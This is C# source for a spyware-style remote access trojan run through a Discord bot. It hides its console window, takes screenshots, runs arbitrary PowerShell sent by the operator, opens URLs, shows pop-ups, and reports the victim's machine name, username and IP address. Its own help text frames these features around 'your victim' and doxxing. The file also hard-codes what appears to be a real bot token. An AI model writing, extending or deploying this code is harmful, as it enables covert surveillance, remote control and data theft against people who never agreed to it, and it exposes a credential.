using Discord;
using Discord.WebSocket;
using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;


//PUT IN YOUR DISCORD BOT TOKEN AT LINE 31  

namespace DeviousBot
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

        public static void Main(string[] args)
        {
            IntPtr GetConsoleWindow = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(GetConsoleWindow, 0);
            new Program().MainAsync().GetAwaiter().GetResult();
        }

        private DiscordSocketClient _client;
        public async Task MainAsync()
        {
            _client = new DiscordSocketClient();
            _client.MessageReceived += CommandHandler;

            var token = "MTAxMjQ2NjU5MjQ0MzAyMzM3MA.GPEd0f.Jyj8i8NLQ5taYYY8-ho7-D6OHvjri7ZeBH9O8Q"; // CHANGE TOKEN HERE

            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task CommandHandler(SocketMessage message)
        {
            //variables
            string command = "";
            int lengthOfCommand = -1;

            //filter messages in here
            if (!message.Content.StartsWith("!"))
                return Task.CompletedTask;

            if (message.Author.IsBot || message.Author.IsWebhook)
                return Task.CompletedTask;

            if (message.Content.Contains(" "))
                lengthOfCommand = message.Content.IndexOf(" ");
            else
                lengthOfCommand = message.Content.Length;

            command = message.Content.Substring(1, lengthOfCommand - 1).ToLower();

            //Commands
            if (command.Equals("hi"))
            {
                message.Channel.SendMessageAsync($@"Hello {message.Author.Mention}");
            }
            else if (command.Equals("help"))
            {
                message.Channel.SendMessageAsync($@"```here is a list of all the commands! :D
--// commands on your victim \\--
!ss ---- take a screenshot of your victim's screen
!url (website url) ---- makes your victim go to your url, rickroll time!!
!shell (powershell script) ---- opens up a powershell on your victim's computer and runs the code you put in ;)
!message (what you wanna say to your victim) ---- makes a pop up message box on victim's computer
!info ---- will tell you the victims machinename username and ip address```");
            }
            else if (command.Equals("ss"))
            {
                wirus.SpywareFunctions.takess();
                message.Channel.SendFileAsync("ss.jpg");
            }
            else if (command.Equals(@"url"))
            {
                string website = message.Content.Substring(4);

                message.Channel.SendMessageAsync("going right to the website!");
                wirus.SpywareFunctions.urlFunc(website);
            }
            else if (command.Equals(@"shell"))
            {
                string shellScript = message.Content.Substring(6);
                message.Channel.SendMessageAsync("sending the shell!");

                wirus.SpywareFunctions.shellFunc(shellScript);
            }
            else if (command.Equals("message"))
            {
                string yourMessage = message.Content.Substring(8);
                message.Channel.SendMessageAsync($@"{Environment.UserName} be getting trolled fr");
                wirus.SpywareFunctions.messageFunc(yourMessage);
            }
            else if (command.Equals("info"))
            {
                message.Channel.SendMessageAsync($@"{Environment.MachineName} / {Environment.UserName} / {wirus.SpywareFunctions.getIp()}");
                message.Channel.SendMessageAsync($@"man is getting doxxed lmao");
            }

            return Task.CompletedTask;
        }

    }
}
